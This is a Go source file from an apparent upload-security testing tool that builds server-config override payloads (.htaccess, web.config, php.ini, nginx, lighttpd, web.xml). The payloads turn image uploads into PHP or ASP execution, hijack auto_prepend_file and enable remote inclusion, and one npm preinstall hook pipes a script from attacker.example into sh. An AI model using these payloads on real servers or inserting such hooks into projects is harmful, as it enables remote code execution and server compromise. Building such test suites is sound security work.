package payload

// moduleServerConfig generates Server Configuration Override payloads.
// Tests for uploading config files that alter server behavior (.htaccess,
// web.config, .user.ini, nginx.conf, etc.) to enable code execution,
// directory listing, or MIME-type confusion.
func moduleServerConfig() []*Payload {
	var tests []*Payload

	// ── Apache .htaccess ────────────────────────────────────────────
	htaccess := []struct {
		name      string
		content   string
		technique string
		tags      []string
	}{
		{
			name: "Enable PHP execution for image extensions",
			content: `AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .png
AddType application/x-httpd-php .gif
AddType application/x-httpd-php .txt`,
			technique: "Apache .htaccess: AddType PHP to image extensions",
			tags:      []string{"server-config", "apache", "htaccess", "php-exec"},
		},
		{
			name: "AddHandler PHP for images",
			content: `AddHandler application/x-httpd-php .jpg
AddHandler application/x-httpd-php .png
AddHandler cgi-script .jpg`,
			technique: "Apache .htaccess: AddHandler PHP via image extension",
			tags:      []string{"server-config", "apache", "htaccess", "php-exec"},
		},
		{
			name:      "Force PHP handler via SetHandler",
			content:   `SetHandler application/x-httpd-php`,
			technique: "Apache .htaccess: SetHandler mod_php for whole dir",
			tags:      []string{"server-config", "apache", "htaccess", "php-exec"},
		},
		{
			name: "Allow from all (access bypass)",
			content: `Order deny,allow
Allow from all`,
			technique: "Apache .htaccess: Override access restrictions",
			tags:      []string{"server-config", "apache", "htaccess", "acl-bypass"},
		},
		{
			name:      "php_value auto_prepend_file",
			content:   `php_value auto_prepend_file /tmp/evil.php`,
			technique: "Apache .htaccess: php_value auto_prepend_file hijack",
			tags:      []string{"server-config", "apache", "htaccess", "php-ini", "auto-prepend"},
		},
		{
			name: "mod_rewrite to shell",
			content: `<IfModule mod_rewrite.c>
RewriteEngine On
RewriteRule ^(.*)$ shell.php [L]
</IfModule>`,
			technique: "Apache .htaccess: mod_rewrite redirect to uploaded shell",
			tags:      []string{"server-config", "apache", "htaccess", "mod-rewrite"},
		},
		{
			name: "Enable CGI execution",
			content: `Options +ExecCGI
AddHandler cgi-script .cgi .pl .sh`,
			technique: "Apache .htaccess: Enable CGI for script upload",
			tags:      []string{"server-config", "apache", "htaccess", "cgi"},
		},
		{
			name: "FilesMatch handler override",
			content: `<FilesMatch "\.(jpg|png|gif|txt|pdf)$">
    SetHandler application/x-httpd-php
</FilesMatch>`,
			technique: "Apache .htaccess: FilesMatch SetHandler PHP",
			tags:      []string{"server-config", "apache", "htaccess", "files-match"},
		},
		{
			name: "AddType for .php5/.phtml",
			content: `AddType application/x-httpd-php .php5
AddType application/x-httpd-php .phtml`,
			technique: "Apache .htaccess: Enable alternative PHP extensions",
			tags:      []string{"server-config", "apache", "htaccess", "alt-ext"},
		},
		{
			name:      "Enable directory listing",
			content:   `Options +Indexes`,
			technique: "Apache .htaccess: Enable directory listing",
			tags:      []string{"server-config", "apache", "htaccess", "dir-listing"},
		},
	}

	for _, p := range htaccess {
		tests = append(tests, &Payload{
			TestType:  TestTypeServerConfig,
			Technique: p.technique,
			Filename:  ".htaccess",
			Extension: "",
			Body:      []byte(p.content),
			Tags:      p.tags,
		})
	}

	// ── IIS web.config ──────────────────────────────────────────────
	webConfig := []struct {
		content   string
		technique string
		tags      []string
	}{
		{
			content: `<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers>
      <add name="ASP" path="*.jpg" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="File" />
    </handlers>
  </system.webServer>
</configuration>`,
			technique: "IIS web.config: Enable ASP execution for .jpg",
			tags:      []string{"server-config", "iis", "web.config", "asp"},
		},
		{
			content: `<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers>
      <add name="ASPX" path="*.jpg" verb="*" type="System.Web.UI.PageHandlerFactory" />
    </handlers>
  </system.webServer>
</configuration>`,
			technique: "IIS web.config: Enable ASP.NET execution for .jpg",
			tags:      []string{"server-config", "iis", "web.config", "aspx"},
		},
		{
			content: `<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <directoryBrowse enabled="true" />
  </system.webServer>
</configuration>`,
			technique: "IIS web.config: Enable directory browsing",
			tags:      []string{"server-config", "iis", "web.config", "dir-listing"},
		},
		{
			content: `<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <staticContent>
      <mimeMap fileExtension=".jpg" mimeType="text/html" />
    </staticContent>
  </system.webServer>
</configuration>`,
			technique: "IIS web.config: MIME type spoof via staticContent",
			tags:      []string{"server-config", "iis", "web.config", "mime"},
		},
	}

	for _, p := range webConfig {
		tests = append(tests, &Payload{
			TestType:  TestTypeServerConfig,
			Technique: p.technique,
			Filename:  "web.config",
			Extension: "",
			Body:      []byte(p.content),
			Tags:      p.tags,
		})
	}

	// ── PHP .user.ini / php.ini ─────────────────────────────────────
	phpIniFiles := []string{".user.ini", "php.ini", ".php.ini", "php5.ini", "php7.ini", "php8.ini"}
	phpIniContents := []struct {
		content   string
		technique string
		tags      []string
	}{
		{
			content:   `auto_prepend_file = /tmp/evil.php`,
			technique: "PHP auto_prepend_file hijack",
			tags:      []string{"server-config", "php", "ini", "auto-prepend"},
		},
		{
			content:   `auto_append_file = /tmp/evil.php`,
			technique: "PHP auto_append_file hijack",
			tags:      []string{"server-config", "php", "ini", "auto-append"},
		},
		{
			content: `allow_url_include = On
allow_url_fopen = On`,
			technique: "PHP enable remote file inclusion",
			tags:      []string{"server-config", "php", "ini", "rfi"},
		},
		{
			content:   `disable_functions =`,
			technique: "PHP disable_functions bypass (empty)",
			tags:      []string{"server-config", "php", "ini", "disable-functions"},
		},
	}

	for _, iniName := range phpIniFiles {
		for _, ini := range phpIniContents {
			tests = append(tests, &Payload{
				TestType:  TestTypeServerConfig,
				Technique: "PHP INI (" + iniName + "): " + ini.technique,
				Filename:  iniName,
				Extension: "",
				Body:      []byte(ini.content),
				Tags:      append(ini.tags, "filename:"+iniName),
			})
		}
	}

	// ── Nginx / Lighttpd ────────────────────────────────────────────
	tests = append(tests, &Payload{
		TestType:  TestTypeServerConfig,
		Technique: "Nginx config: MIME override for images",
		Filename:  "nginx.conf",
		Extension: "",
		Body: []byte(`location ~ \.jpg$ {
    add_header Content-Type "text/html";
}`),
		Tags: []string{"server-config", "nginx", "mime"},
	})

	tests = append(tests, &Payload{
		TestType:  TestTypeServerConfig,
		Technique: "Lighttpd config: MIME type override",
		Filename:  "lighttpd.conf",
		Extension: "",
		Body: []byte(`server.document-root = "/var/www/html"
mimetype.assign = (
  ".jpg" => "application/x-httpd-php"
)`),
		Tags: []string{"server-config", "lighttpd", "mime"},
	})

	// ── Tomcat / Java ──────────────────────────────────────────────
	tests = append(tests, &Payload{
		TestType:  TestTypeServerConfig,
		Technique: "Tomcat web.xml: Register JSP servlet",
		Filename:  "web.xml",
		Extension: "",
		Body: []byte(`<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee">
  <servlet>
    <servlet-name>jsp</servlet-name>
    <jsp-file>/shell.jsp</jsp-file>
  </servlet>
</web-app>`),
		Tags: []string{"server-config", "tomcat", "java", "web.xml"},
	})

	// ── Node.js package.json preinstall hook ────────────────────────
	tests = append(tests, &Payload{
		TestType:  TestTypeServerConfig,
		Technique: "Node.js package.json preinstall RCE hook",
		Filename:  "package.json",
		Extension: "",
		Body: []byte(`{
  "name": "exploit",
  "version": "1.0.0",
  "main": "evil.js",
  "scripts": {
    "preinstall": "curl https://attacker.example/shell.sh | sh"
  }
}`),
		Tags: []string{"server-config", "nodejs", "npm", "preinstall"},
	})

	return tests
}
